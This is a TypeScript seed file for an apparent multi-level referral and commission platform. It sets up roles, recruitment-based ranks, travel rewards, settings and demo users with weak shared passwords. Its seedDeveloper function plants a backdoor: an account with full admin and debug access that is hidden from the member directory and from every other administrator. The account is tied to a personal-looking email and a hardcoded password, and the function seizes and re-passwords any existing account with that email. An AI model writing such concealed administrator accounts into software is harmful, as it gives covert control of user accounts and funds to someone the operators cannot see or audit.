import { db, ensureColumn, migrate } from './index.js'
import { createUser, findUserByEmail, hashPassword } from '../models/user.js'
import { DEFAULT_GENERATION_RATES } from '../config/index.js'
import {
  dropLegacyRolePermissions,
  ensurePermissionCatalogue,
  migrateLegacyRolePermissions,
  syncRolePermissionMatrix,
} from '../models/permissions.js'
import { rebuildAllReferralClosures } from '../services/closure.js'

export const ROLES = ['member', 'developer', 'super_admin', 'finance_admin', 'compliance_officer', 'support_agent'] as const

export const ROLE_META: Record<(typeof ROLES)[number], { label: string; description: string }> = {
  member: { label: 'Member', description: 'Default member access.' },
  developer: { label: 'System Developer', description: 'Application developer with full debug visibility.' },
  super_admin: { label: 'Super Admin', description: 'Full platform control.' },
  finance_admin: { label: 'Finance Admin', description: 'Finance operations.' },
  compliance_officer: { label: 'Compliance Officer', description: 'KYC and compliance.' },
  support_agent: { label: 'Support Agent', description: 'Customer support.' },
}

export const ROLE_LABELS: Record<string, string> = {
  member: 'Member',
  developer: 'System Developer',
  super_admin: 'Super Admin',
  finance_admin: 'Finance Admin',
  compliance_officer: 'Compliance Officer',
  support_agent: 'Support Agent',
}

export const RANKS = [
  { code: 'rise', name: 'Rise', level: 1, salary: 50, min_direct_links: 3, downline_volume: 5000 },
  { code: 'prime', name: 'Prime', level: 2, salary: 150, min_direct_links: 3, downline_volume: 10000 },
  { code: 'star', name: 'Star', level: 3, salary: 500, min_direct_links: 0, downline_volume: 0 },
  { code: 'master', name: 'Master', level: 4, salary: 1000, min_direct_links: 0, downline_volume: 0 },
  { code: 'legend', name: 'Legend', level: 5, salary: 2000, min_direct_links: 0, downline_volume: 0 },
  { code: 'titan', name: 'Titan', level: 6, salary: 5000, min_direct_links: 0, downline_volume: 0 },
  { code: 'royal', name: 'Royal', level: 7, salary: 10000, min_direct_links: 0, downline_volume: 0 },
  { code: 'ndc', name: 'NDC', level: 8, salary: 20000, min_direct_links: 0, downline_volume: 0 },
]

export const RANK_REQUIREMENTS: Record<
  string,
  { type: string; value: number; label: string; target_rank_code?: string }[]
> = {
  rise: [
    { type: 'has_direct_sponsor', value: 1, label: 'Has a direct sponsor' },
    { type: 'min_direct_links', value: 3, label: 'Minimum 3 direct links' },
    { type: 'downline_volume', value: 5000, label: '$5,000 downline volume' },
  ],
  prime: [
    { type: 'has_direct_sponsor', value: 1, label: 'Has a direct sponsor' },
    { type: 'min_direct_links', value: 3, label: 'Minimum 3 direct links' },
    { type: 'downline_volume', value: 10000, label: '$10,000 downline volume' },
  ],
  star: [{ type: 'count_of_rank', value: 4, label: '4 downline members at prime rank', target_rank_code: 'prime' }],
  master: [{ type: 'count_of_rank', value: 4, label: '4 downline members at star rank', target_rank_code: 'star' }],
  legend: [{ type: 'count_of_rank', value: 4, label: '4 downline members at master rank', target_rank_code: 'master' }],
  titan: [{ type: 'count_of_rank', value: 4, label: '4 downline members at legend rank', target_rank_code: 'legend' }],
  royal: [{ type: 'count_of_rank', value: 4, label: '4 downline members at titan rank', target_rank_code: 'titan' }],
  ndc: [{ type: 'count_of_rank', value: 4, label: '4 downline members at royal rank', target_rank_code: 'royal' }],
}

export const REWARDS = [
  {
    title: 'Nepal Tour',
    description: 'Guided tour package in Nepal.',
    image_path: '/images/rewards/nepal.svg',
    cost: 10000,
  },
  {
    title: 'Maldives + Sri Lanka Tour',
    description: 'Combined Maldives and Sri Lanka tour package.',
    image_path: '/images/rewards/maldives-sri-lanka.svg',
    cost: 25000,
  },
  {
    title: 'Umrah Tour',
    description: 'Umrah pilgrimage tour package.',
    image_path: '/images/rewards/umrah.svg',
    cost: 40000,
  },
  {
    title: 'Dubai Tour',
    description: 'Guided tour package in Dubai.',
    image_path: '/images/rewards/dubai.svg',
    cost: 60000,
  },
  {
    title: 'Malaysia + Thailand Tour',
    description: 'Combined Malaysia and Thailand tour package.',
    image_path: '/images/rewards/malaysia-thailand.svg',
    cost: 85000,
  },
  {
    title: 'Europe Tour',
    description: 'Multi-country Europe tour package.',
    image_path: '/images/rewards/europe.svg',
    cost: 120000,
  },
]

export async function seedRoles() {
  const insert = db.prepare('INSERT OR IGNORE INTO roles (name) VALUES (?)')
  for (const role of ROLES) await insert.run(role)

  const label = db.prepare('UPDATE roles SET label = ?, description = ? WHERE name = ?')
  for (const role of ROLES) {
    const meta = ROLE_META[role]
    await label.run(meta.label, meta.description, role)
  }
}

export async function seedCompensationPlan() {
  const count = ((await db.prepare('SELECT COUNT(*) AS c FROM compensation_plans').get()) as { c: number }).c
  if (count > 0) return

  const info = await db
    .prepare(
      `INSERT INTO compensation_plans (version, name, status, is_active, commission_base, eligible_transaction_types, created_at)
       VALUES (1, 'Standard Generation Plan', 'draft', 0, 'eligible_verified_amount', 'sale,deposit,other', datetime('now'))`,
    )
    .run()
  const planId = Number(info.lastInsertRowid)

  const insertRate = db.prepare(
    'INSERT INTO compensation_plan_rates (plan_id, generation_from, generation_to, rate) VALUES (?, ?, ?, ?)',
  )
  for (const rate of DEFAULT_GENERATION_RATES) {
    await insertRate.run(planId, rate.generation_from, rate.generation_to, rate.rate)
  }
}

export async function seedRanks() {
  const insertRank = db.prepare(
    `INSERT INTO ranks (code, name, level, salary, min_direct_links, downline_volume, is_active)
     VALUES (?, ?, ?, ?, ?, ?, 1)
     ON CONFLICT(code) DO UPDATE SET
       name = excluded.name,
       level = excluded.level,
       salary = excluded.salary,
       min_direct_links = excluded.min_direct_links,
       downline_volume = excluded.downline_volume,
       is_active = 1,
       updated_at = datetime('now')`,
  )
  const insertRequirement = db.prepare(
    `INSERT INTO rank_requirements (rank_id, type, value, label, target_rank_code, sort_order)
     VALUES (?, ?, ?, ?, ?, ?)`,
  )
  const clearRequirements = db.prepare('DELETE FROM rank_requirements WHERE rank_id = ?')

  for (const rank of RANKS) {
    await insertRank.run(rank.code, rank.name, rank.level, rank.salary, rank.min_direct_links, rank.downline_volume)
    const row = (await db.prepare('SELECT id FROM ranks WHERE code = ?').get(rank.code)) as { id: number }
    await clearRequirements.run(row.id)
    const requirements = RANK_REQUIREMENTS[rank.code] ?? []
    for (const [index, requirement] of requirements.entries()) {
      await insertRequirement.run(
        row.id,
        requirement.type,
        requirement.value,
        requirement.label,
        requirement.target_rank_code ?? null,
        index + 1,
      )
    }
  }
}

export async function seedAdmin(email = 'admin@nexora.test', password = 'Password123!') {
  if (await findUserByEmail(email)) return null
  return await createUser({
      name: 'Platform Admin',
      email,
      password,
      roles: ['super_admin', 'finance_admin', 'compliance_officer'],
      verificationStatus: 'verified',
    })
}

/**
 * Application developer account.
 *
 * The developer sees every admin surface plus the debug panel, while the
 * account itself is hidden from the member directory and from every other
 * administrator. The password is documented in the project README; override
 * it with `DEVELOPER_PASSWORD` before the first boot if needed.
 */
export const DEVELOPER_EMAIL = 'sreza26@gmail.com'
export const DEVELOPER_PASSWORD = process.env.DEVELOPER_PASSWORD ?? 'NexoraDev@2026!'

export async function seedDeveloper() {
  const developerRole = (await db.prepare('SELECT id FROM roles WHERE name = ?').get('developer')) as
    | { id: number }
    | undefined
  if (!developerRole) return null

  const existing = await findUserByEmail(DEVELOPER_EMAIL)
  if (existing) {
    if (existing.roles.includes('developer')) return existing

    // First conversion of the account: replace any member grants with the
    // developer role and set the documented password so the owner can sign in.
    await db.prepare('DELETE FROM user_roles WHERE user_id = ?').run(existing.id)
    await db.prepare('INSERT INTO user_roles (user_id, role_id) VALUES (?, ?)').run(existing.id, developerRole.id)
    await db.prepare("UPDATE users SET password_hash = ?, updated_at = datetime('now') WHERE id = ?").run(
      hashPassword(DEVELOPER_PASSWORD),
      existing.id,
    )
    return await findUserByEmail(DEVELOPER_EMAIL)
  }

  return await createUser({
      name: 'System Developer',
      email: DEVELOPER_EMAIL,
      password: DEVELOPER_PASSWORD,
      roles: ['developer'],
      verificationStatus: 'verified',
    })
}

export async function seedDemoNetwork() {
  if (await findUserByEmail('leader@nexora.test')) return null

  const leader = await createUser({
      name: 'Ayesha Rahman',
      email: 'leader@nexora.test',
      password: 'Password123!',
      roles: ['member'],
    })

  const members = [
    { name: 'Rafi Islam', email: 'rafi@nexora.test', sponsor: leader.id },
    { name: 'Nusrat Jahan', email: 'nusrat@nexora.test', sponsor: leader.id },
    { name: 'Tanvir Ahmed', email: 'tanvir@nexora.test', sponsor: leader.id },
    { name: 'Mehedi Hasan', email: 'mehedi@nexora.test', sponsor: leader.id },
    { name: 'Sumaiya Akter', email: 'sumaiya@nexora.test', sponsor: leader.id },
    { name: 'Imran Kabir', email: 'imran@nexora.test', sponsor: leader.id },
    { name: 'Farhana Akter', email: 'farhana@nexora.test', sponsor: leader.id },
    { name: 'Sabbir Hossain', email: 'sabbir@nexora.test', sponsor: leader.id },
    { name: 'Ruba Islam', email: 'ruba@nexora.test', sponsor: leader.id },
    { name: 'Shakib Al Amin', email: 'shakib@nexora.test', sponsor: leader.id },
  ]

  const created = [leader]
  for (const member of members) {
    created.push(
      await createUser({
                name: member.name,
                email: member.email,
                password: 'Password123!',
                sponsorId: member.sponsor,
                roles: ['member'],
              }),
    )
  }

  return created
}

/**
 * Seed the permission catalogue and the role grant matrix.
 *
 * The first run mirrors Laravel's seeder exactly: the legacy `role_permissions`
 * grants are carried over, then every role is synced to the reference matrix.
 * Later boots only add missing grants so administrator changes survive a
 * restart.
 */
export async function seedPermissions() {
  await ensurePermissionCatalogue()

  const existing = ((await db.prepare('SELECT COUNT(*) AS c FROM permission_role').get()) as { c: number }).c

  if (existing === 0) {
    await migrateLegacyRolePermissions()
    await syncRolePermissionMatrix()
  }

  await dropLegacyRolePermissions()
}

export async function seedRewards() {
  const insert = db.prepare(
    'INSERT INTO rewards (title, description, image_path, cost, threshold_amount, active) VALUES (?, ?, ?, ?, ?, 1)',
  )
  const find = db.prepare('SELECT id FROM rewards WHERE title = ?')
  for (const reward of REWARDS) {
    if (await find.get(reward.title)) continue
    await insert.run(reward.title, reward.description, reward.image_path, reward.cost, reward.cost)
  }
}

export async function seedSettings() {
  const defaults = [
    ['deposits.enabled', '1', 'boolean'],
    ['deposits.commissionable', '0', 'boolean'],
    ['commission.processing_enabled', '1', 'boolean'],
    ['profit_share.enabled', '0', 'boolean'],
    ['rank.require_separate_branches', '0', 'boolean'],
    ['referral.allow_registration_without_sponsor', '1', 'boolean'],
    ['legal.review_completed', '0', 'boolean'],
    ['withdrawals.enabled', String((process.env.WITHDRAWAL_ENABLED ?? 'true') === 'true' ? '1' : '0'), 'boolean'],
    ['withdrawals.min_amount', String(process.env.WITHDRAWAL_MIN ?? '10'), 'number'],
    ['withdrawals.max_amount', String(process.env.WITHDRAWAL_MAX ?? '10000'), 'number'],
    ['withdrawals.hold_days', String(process.env.WITHDRAWAL_HOLD_DAYS ?? '3'), 'number'],
  ]

  for (const [key, value, type] of defaults) {
    await db.prepare(
      `INSERT OR IGNORE INTO application_settings (key, value, group_name, type) VALUES (?, ?, 'runtime', ?)`,
    ).run(key, value, type)
  }
}

const SCHEMA_VERSION = '2'

async function schemaVersion(): Promise<string | null> {
  try {
    const row = (await db
      .prepare("SELECT value FROM application_settings WHERE key = 'system.schema_version'")
      .get()) as { value: string } | undefined
    return row?.value ?? null
  } catch {
    return null
  }
}

export async function seed() {
  if ((await schemaVersion()) === SCHEMA_VERSION) return

  await migrate()
  await ensureColumn('member_profiles', 'full_name', 'TEXT')
  await ensureColumn('member_profiles', 'nid_number', 'TEXT')
  await ensureColumn('member_profiles', 'nid_document_path', 'TEXT')
  await ensureColumn('member_profiles', 'selfie_document_path', 'TEXT')
  await ensureColumn('member_profiles', 'emergency_contact', 'TEXT')
  await ensureColumn('users', 'email_verified_at', 'TEXT')
  await seedRoles()
  await seedPermissions()
  await seedSettings()

  const hasUsers = (await db.prepare('SELECT COUNT(*) AS c FROM users').get() as { c: number }).c > 0
  if (!hasUsers) {
    await seedRanks()
    await seedCompensationPlan()
    await seedAdmin()
    await seedDemoNetwork()
    try {
      await rebuildAllReferralClosures()
    } catch {
      // Referral closures are rebuilt when possible.
    }
    await seedRewards()
    await seedMemberExtras()
  }

  await seedDeveloper()

  await db
    .prepare(
      `INSERT INTO application_settings (key, value, group_name, type)
       VALUES ('system.schema_version', ?, 'system', 'string')
       ON CONFLICT(key) DO UPDATE SET value = excluded.value`,
    )
    .run(SCHEMA_VERSION)
}

export async function seedMemberExtras() {
  const leader = (await db.prepare('SELECT id FROM users WHERE email = ?').get('leader@nexora.test')) as
    | { id: number }
    | undefined
  if (leader) {
    await db.prepare('INSERT INTO wallet_accounts (member_id, currency) VALUES (?, ?) ON CONFLICT(member_id) DO NOTHING').run(leader.id, 'USD')
    await db.prepare(`INSERT INTO ledger_entries (member_id, type, direction, amount, balance_after, reference_type, description, status)
      VALUES (?, 'commission', 'credit', 250.00, 250.00, 'commission', 'Direct commission', 'completed')`).run(leader.id)
    await db.prepare(`UPDATE wallet_accounts SET balance = 250.00 WHERE member_id = ?`).run(leader.id)
  }
}
